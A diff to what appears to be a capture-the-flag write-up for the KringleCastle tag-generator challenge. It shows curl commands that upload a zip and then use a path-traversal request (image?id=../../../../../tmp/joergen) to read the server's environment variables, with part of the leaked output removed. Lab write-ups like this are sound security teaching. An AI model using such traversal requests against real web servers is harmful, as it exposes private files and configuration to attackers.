@@ -39,26 +39,13 @@ jsw@io:*$ zip joergen.zip *.jpg
 jsw@io:*$ curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
 ["7ebc17be-a3ea-48f5-95ea-730e1b006520.jpg"]
 jsw@io:*$ sleep 5
-jsw@io:*t/z$ curl https://tag-generator.kringlecastle.com/image?id=../../../../../tmp/joergen
+jsw@io:*$ curl https://tag-generator.kringlecastle.com/image?id=../tmp/joergen
 RUBY_MAJOR=2.7
 GREETZ=JackFrostWasHere
-HOSTNAME=cbf2810b7573
-PORT=4141
-HOME=/home/app
-BUNDLE_APP_CONFIG=/usr/local/bundle
-RUBY_VERSION=2.7.0
-RACK_ENV=development
-APP_HOME=/app
-PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-HOST=0.0.0.0
-GEM_HOME=/usr/local/bundle
-RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343
-PWD=/tmp
-BUNDLE_SILENCE_ROOT_WARNING=1
-
+[..]
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTc5NDA3MzQyOSwxOTMzMzYxNzg3LC0xND
+eyJoaXN0b3J5IjpbLTgwNDgwNDgwNCwxOTMzMzYxNzg3LC0xND
 Y3NjE1MjYyLC0yNDM5NDI4NjYsMTMxMjA1NjQ1Myw5MjA0NTU4
 NjUsLTE2MDYwNzgwNDBdfQ==
 -->
